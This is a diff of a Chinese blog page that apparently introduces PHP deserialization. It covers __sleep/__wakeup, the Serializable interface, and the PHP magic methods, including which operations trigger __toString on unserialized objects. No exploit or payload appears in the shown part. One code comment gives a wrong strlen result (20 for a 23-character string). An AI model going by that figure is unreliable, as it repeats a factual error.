-                     data-src="/2024/11/11/PHP%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/images/852087b5df10f2450fe7fbc04b8803c8.png"
-                      alt="在这里插入图片描述"
-                ><br>这里解释一下为什么数组第二项为指针引用：</p>
+                     data-src="images/852087b5df10f2450fe7fbc04b8803c8.png"
+                     
+alt="在这里插入图片描述" 
+                > 这里解释一下为什么数组第二项为指针引用：</p>
 <ul>
 <li>首先数组中的 object 默认是指针引用。</li>
-<li>下图中左边是按照定义生成的引用关系图，观察发现 <code>b</code> 与 <code>b&#39;</code> 出边相同（哈希相同），因此可以优化掉一个。</li>
+<li>下图中左边是按照定义生成的引用关系图，观察发现 <code>b</code> 与
+<code>b'</code> 出边相同（哈希相同），因此可以优化掉一个。</li>
 <li>此时数组第二项变为指针引用，且与原本定义等价。</li>
 </ul>
-<p><img  
+<figure>
+<img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2024/11/11/PHP%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/images/bbb36b42e100789af36c3891acf3c20e.png"
-                      alt="在这里插入图片描述"
-                ></p>
-<h2 id="自定义对象序列化"><a href="#自定义对象序列化" class="headerlink" title="自定义对象序列化"></a>自定义对象序列化</h2><h3 id="使用-sleep-和-wakeup-自定义序列化"><a href="#使用-sleep-和-wakeup-自定义序列化" class="headerlink" title="使用 __sleep 和 __wakeup 自定义序列化"></a>使用 __sleep 和 __wakeup 自定义序列化</h3><p>在 PHP 4 中，提供了 <code>__sleep</code> 和 <code>__wakeup</code> 这两个魔术方法来自定义对象的序列化。这两个方法并不会改变对象序列化的格式，而是影响被序列化字段的个数。</p>
+                     data-src="images/bbb36b42e100789af36c3891acf3c20e.png"
+                     
+alt="在这里插入图片描述" 
+                >
+<figcaption aria-hidden="true">在这里插入图片描述</figcaption>
+</figure>
+<h2 id="自定义对象序列化">自定义对象序列化</h2>
+<h3 id="使用-__sleep-和-__wakeup-自定义序列化">使用 __sleep 和 __wakeup
+自定义序列化</h3>
+<p>在 PHP 4 中，提供了 <code>__sleep</code> 和 <code>__wakeup</code>
+这两个魔术方法来自定义对象的序列化。这两个方法并不会改变对象序列化的格式，而是影响被序列化字段的个数。</p>
 <ul>
 <li><code>__sleep</code>：在对象被<strong>序列化</strong>时调用。它应该返回一个包含对象中所有需要被序列化的属性名的数组。</li>
 <li><code>__wakeup()</code>：在对象被<strong>反序列化</strong>时调用。它通常用来完成序列化后的初始化任务。</li>
 </ul>
 <p>例如下面这段代码：</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$connection</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">        <span class="comment">// 模拟数据库连接</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;connection = <span class="string">&quot;Database connection established&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 在序列化前关闭数据库连接</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;connection = <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">// 返回需要序列化的属性数组</span></span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 在反序列化时重新建立数据库连接</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;connection = <span class="string">&quot;Database connection re-established&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建对象并序列化</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>(<span class="string">&quot;example&quot;</span>, <span class="string">&quot;some data&quot;</span>);</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Serialized: &quot;</span> . <span class="variable">$serialized</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化对象并输出</span></span><br><span class="line"><span class="variable">$unserialized</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialized</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Unserialized: &quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$unserialized</span>);</span><br></pre></td></tr></table></figure></div>
-
 <p>这段代码的输出如下：</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Serialized: O:7:&quot;MyClass&quot;:2:&#123;s:4:&quot;name&quot;;s:7:&quot;example&quot;;s:13:&quot;\0MyClass\0data&quot;;s:9:&quot;some data&quot;;&#125;</span><br><span class="line">Unserialized: MyClass Object</span><br><span class="line">(</span><br><span class="line">    [name] =&gt; example</span><br><span class="line">    [data:MyClass:private] =&gt; some data</span><br><span class="line">    [connection:protected] =&gt; Database connection re-established</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>
-
 <ul>
-<li><code>__sleep</code> 方法返回一个包含需要被序列化的属性名的数组。在这个例子中，我们只序列化 <code>name</code> 和 <code>data</code> 属性。</li>
-<li><code>__wakeup</code> 方法在对象反序列化之后调用，这里我们加上反序列化后在该函数中完成数据库连接建立，因此更新连接状态 <code>connection</code>。</li>
+<li><code>__sleep</code>
+方法返回一个包含需要被序列化的属性名的数组。在这个例子中，我们只序列化
+<code>name</code> 和 <code>data</code> 属性。</li>
+<li><code>__wakeup</code>
+方法在对象反序列化之后调用，这里我们加上反序列化后在该函数中完成数据库连接建立，因此更新连接状态
+<code>connection</code>。</li>
 </ul>
 <p>从上述例子也可以看出：<strong>反序列化不要求序列化字符串记录对象的全部属性。</strong></p>
-<h3 id="使用-Serializable-接口自定义序列化"><a href="#使用-Serializable-接口自定义序列化" class="headerlink" title="使用  Serializable 接口自定义序列化"></a>使用  Serializable 接口自定义序列化</h3><p>在 PHP 5 中引入了接口功能，并且提供了 <code>Serializable</code> 接口。通过实现 <code>Serializable</code> 接口，用户可以自定义对象的序列化和反序列化行为。当一个对象实现了 <code>Serializable</code> 接口后，在序列化时，标识符将从 <code>O</code>（表示对象）变为 <code>C</code>（表示自定义序列化）。</p>
-<p><code>Serializable</code> 接口定义了 <code>serialize</code> 和 <code>unserialize</code> 两个方法：</p>
+<h3 id="使用-serializable-接口自定义序列化">使用 Serializable
+接口自定义序列化</h3>
+<p>在 PHP 5 中引入了接口功能，并且提供了 <code>Serializable</code>
+接口。通过实现 <code>Serializable</code>
+接口，用户可以自定义对象的序列化和反序列化行为。当一个对象实现了
+<code>Serializable</code> 接口后，在序列化时，标识符将从
+<code>O</code>（表示对象）变为 <code>C</code>（表示自定义序列化）。</p>
+<p><code>Serializable</code> 接口定义了 <code>serialize</code> 和
+<code>unserialize</code> 两个方法：</p>
 <ul>
 <li><code>serialize()</code>：用于定义对象的序列化行为。应该返回一个表示对象的序列化字符串。</li>
-<li><code>unserialize($data)</code>：用于定义对象的反序列化行为。接受一个字符串参数 <code>$data</code>，用于恢复对象的状态。</li>
+<li><code>unserialize($data)</code>：用于定义对象的反序列化行为。接受一个字符串参数
+<code>$data</code>，用于恢复对象的状态。</li>
 </ul>
-<p>当对象实现了 <code>Serializable</code> 接口并被序列化时，使用 <code>C</code> 标识符，格式为：<code>C:&lt;length_class_name&gt;:&quot;&lt;class_name&gt;&quot;:&lt;length_serialized_data&gt;:&#123;&lt;serialized_data&gt;&#125;</code></p>
+<p>当对象实现了 <code>Serializable</code> 接口并被序列化时，使用
+<code>C</code>
+标识符，格式为：<code>C:&lt;length_class_name&gt;:"&lt;class_name&gt;":&lt;length_serialized_data&gt;:&#123;&lt;serialized_data&gt;&#125;</code></p>
 <ul>
 <li><code>&lt;length_class_name&gt;</code>：类名的长度。</li>
 <li><code>&lt;class_name&gt;</code>：类名。</li>
@@ -499,82 +564,92 @@
 <li><code>&lt;serialized_data&gt;</code>：序列化数据。</li>
 </ul>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$member</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;member = <span class="string">&#x27;member value&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 自定义序列化逻辑，使用 WDDX 序列化成员变量</span></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">wddx_serialize_value</span>(<span class="variable">$this</span>-&gt;member);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 自定义反序列化逻辑，使用 WDDX 反序列化数据</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;member = <span class="title function_ invoke__">wddx_deserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化对象</span></span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$serialized</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化对象并输出</span></span><br><span class="line"><span class="variable">$unserialized</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialized</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$unserialized</span>);</span><br></pre></td></tr></table></figure></div>
-
 <p>当运行上述代码时，输出结果将是：</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:7:&quot;MyClass&quot;:90:&#123;&lt;wddxPacket version=&#x27;1.0&#x27;&gt;&lt;header/&gt;&lt;data&gt;&lt;string&gt;member value&lt;/string&gt;&lt;/data&gt;&lt;/wddxPacket&gt;&#125;</span><br><span class="line">MyClass Object</span><br><span class="line">(</span><br><span class="line">    [member] =&gt; member value</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>
-
-<h1 id="PHP-魔术方法"><a href="#PHP-魔术方法" class="headerlink" title="PHP 魔术方法"></a>PHP 魔术方法</h1><h2 id="生命周期相关"><a href="#生命周期相关" class="headerlink" title="生命周期相关"></a>生命周期相关</h2><h3 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h3><p><strong>定义</strong>：</p>
+<h1 id="php-魔术方法">PHP 魔术方法</h1>
+<h2 id="生命周期相关">生命周期相关</h2>
+<h3 id="construct">__construct()</h3>
+<p><strong>定义</strong>：</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br></pre></td></tr></table></figure></div>
-
 <p><strong>用途</strong>：创建对象时触发。</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Object is being created.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h3><p><strong>定义</strong>：</p>
+<h3 id="destruct">__destruct()</h3>
+<p><strong>定义</strong>：</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br></pre></td></tr></table></figure></div>
-
 <p><strong>用途</strong>：当对象被销毁时触发。</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Object is being destroyed.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$obj</span>); <span class="comment">// 或者脚本结束时触发</span></span><br></pre></td></tr></table></figure></div>
-
-<h2 id="序列化相关"><a href="#序列化相关" class="headerlink" title="序列化相关"></a>序列化相关</h2><h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h3><p><strong>定义</strong>：</p>
+<h2 id="序列化相关">序列化相关</h2>
+<h3 id="wakeup">__wakeup()</h3>
+<p><strong>定义</strong>：</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br></pre></td></tr></table></figure></div>
-
-<p><strong>用途</strong>：<code>unserialize()</code> 会检查是否存在一个 <code>__wakeup()</code> 方法。如果存在，则会先调用 <code>__wakeup</code> 方法，预先准备对象需要的资源。</p>
+<p><strong>用途</strong>：<code>unserialize()</code> 会检查是否存在一个
+<code>__wakeup()</code> 方法。如果存在，则会先调用 <code>__wakeup</code>
+方法，预先准备对象需要的资源。</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Object is being unserialized.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="variable">$unserialized</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialized</span>);</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h3><p><strong>定义</strong>：</p>
+<h3 id="sleep">__sleep()</h3>
+<p><strong>定义</strong>：</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br></pre></td></tr></table></figure></div>
-
 <p><strong>用途</strong>：对象被序列化之前触发。返回一个包含需要序列化的属性名的数组。</p>
 <p><strong>返回值</strong>：一个包含需要序列化的属性名的数组。</p>
-<h2 id="类型转换相关"><a href="#类型转换相关" class="headerlink" title="类型转换相关"></a>类型转换相关</h2><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h3><p><strong>定义</strong>：</p>
+<h2 id="类型转换相关">类型转换相关</h2>
+<h3 id="tostring">__toString()</h3>
+<p><strong>定义</strong>：</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br></pre></td></tr></table></figure></div>
-
 <p><strong>用途</strong>：当对象被当成字符串使用时应如何回应。必须返回一个字符串。</p>
 <p><strong>触发方式</strong>：本质就是找有没有类型涉及<strong>对象向字符串做类型转换</strong>的操作。</p>
 <ul>
-<li><strong>输出操作</strong>	：使用 <code>echo</code> 或 <code>print</code> 打印对象时会触发 <code>__toString</code> 方法。</li>
-<li><strong>字符串操作</strong>：对象参与字符串相关操作时会触发 <code>__toString</code> 调用。<ul>
+<li><strong>输出操作</strong> ：使用 <code>echo</code> 或
+<code>print</code> 打印对象时会触发 <code>__toString</code> 方法。</li>
+<li><strong>字符串操作</strong>：对象参与字符串相关操作时会触发
+<code>__toString</code> 调用。
+<ul>
 <li><strong>字符串拼接</strong>：反序列化对象与字符串拼接时触发。</li>
-<li><strong>字符串比较</strong>：反序列化对象与字符串进行 <code>==</code> 比较时触发（涉及类型转换）。</li>
-</ul>
-</li>
-<li><strong>字符串参数</strong>：函数参数是字符串类型时如果将对象传入会触发 <code>__toString</code> 调用。<ul>
-<li><strong>字符串函数</strong>：反序列化对象作为参数传递给字符串函数时触发，如 <code>strlen()</code>、<code>addslashes()</code>。</li>
-<li><strong><code>class_exists()</code> 函数</strong>：反序列化对象作为 <code>class_exists()</code> 的参数时触发。</li>
-<li><strong><code>file_exists()</code> 函数</strong>：反序列化对象作为 <code>file_exists()</code> 的参数时触发。</li>
-</ul>
-</li>
-<li><strong>函数实现</strong>：函数实现涉及对对象的字符串操作时会触发对象的 <code>__toString</code> 调用。<ul>
-<li><strong><code>in_array()</code> 函数</strong>：第一个参数是反序列化对象，第二个参数的数组中有 <code>__toString</code> 返回的字符串时触发。</li>
-<li><strong>格式化字符串</strong>：反序列化对象参与格式化字符串时触发，如 <code>printf</code> 或 <code>sprintf</code>。</li>
-</ul>
-</li>
+<li><strong>字符串比较</strong>：反序列化对象与字符串进行
+<code>==</code> 比较时触发（涉及类型转换）。</li>
+</ul></li>
+<li><strong>字符串参数</strong>：函数参数是字符串类型时如果将对象传入会触发
+<code>__toString</code> 调用。
+<ul>
+<li><strong>字符串函数</strong>：反序列化对象作为参数传递给字符串函数时触发，如
+<code>strlen()</code>、<code>addslashes()</code>。</li>
+<li><strong><code>class_exists()</code> 函数</strong>：反序列化对象作为
+<code>class_exists()</code> 的参数时触发。</li>
+<li><strong><code>file_exists()</code> 函数</strong>：反序列化对象作为
+<code>file_exists()</code> 的参数时触发。</li>
+</ul></li>
+<li><strong>函数实现</strong>：函数实现涉及对对象的字符串操作时会触发对象的
+<code>__toString</code> 调用。
+<ul>
+<li><strong><code>in_array()</code>
+函数</strong>：第一个参数是反序列化对象，第二个参数的数组中有
+<code>__toString</code> 返回的字符串时触发。</li>
+<li><strong>格式化字符串</strong>：反序列化对象参与格式化字符串时触发，如
+<code>printf</code> 或 <code>sprintf</code>。</li>
+</ul></li>
 </ul>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	    <span class="keyword">echo</span> <span class="keyword">__FUNCTION__</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;This is MyClass object.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serializedObj</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">MyClass</span>());</span><br><span class="line"><span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serializedObj</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 打印对象</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>; <span class="comment">// 输出: This is MyClass object.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 字符串连接</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;Object: &quot;</span> . <span class="variable">$obj</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span> . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 输出: Object: This is MyClass object.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 格式化字符串</span></span><br><span class="line"><span class="title function_ invoke__">printf</span>(<span class="string">&quot;Object: %s\n&quot;</span>, <span class="variable">$obj</span>); <span class="comment">// 输出: Object: This is MyClass object.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 字符串比较</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$obj</span> == <span class="string">&quot;This is MyClass object.&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Match\n&quot;</span>; <span class="comment">// 输出: Match</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. 字符串函数</span></span><br><span class="line"><span class="variable">$length</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Length: <span class="subst">$length</span>\n&quot;</span>; <span class="comment">// 输出: Length: 20</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 6. in_array 函数</span></span><br><span class="line"><span class="variable">$array</span> = [<span class="string">&quot;This is MyClass object.&quot;</span>, <span class="string">&quot;Another string&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$obj</span>, <span class="variable">$array</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Found in array\n&quot;</span>; <span class="comment">// 输出: Found in array</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 7. class_exists 函数</span></span><br><span class="line"><span class="variable">$class_exists</span> = <span class="title function_ invoke__">class_exists</span>(<span class="variable">$obj</span>); <span class="comment">// 这不是一个推荐的用法，但会触发 __toString</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Class exists: &quot;</span> . (<span class="variable">$class_exists</span> ? <span class="string">&#x27;true&#x27;</span> : <span class="string">&#x27;false&#x27;</span>) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 输出: Class exists: false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 8. file_exists 函数</span></span><br><span class="line"><span class="variable">$file_exists</span> = <span class="title function_ invoke__">file_exists</span>(<span class="variable">$obj</span>); <span class="comment">// 这也不是一个推荐的用法，但会触发 __toString</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;File exists: &quot;</span> . (<span class="variable">$file_exists</span> ? <span class="string">&#x27;true&#x27;</span> : <span class="string">&#x27;false&#x27;</span>) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 输出: File exists: false</span></span><br></pre></td></tr></table></figure></div>
-
-<h3 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a>__invoke()</h3><p><strong>定义</strong>：</p>
+<h3 id="invoke">__invoke()</h3>
+<p><strong>定义</strong>：</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$arg</span></span>)</span></span><br></pre></td></tr></table></figure></div>
-
 <p><strong>参数</strong>：</p>
 <ul>
 <li><code>$arg</code>：调用对象时传递的参数。</li>
 </ul>
 <p><strong>用途</strong>：当脚本尝试将对象调用为函数时触发。</p>
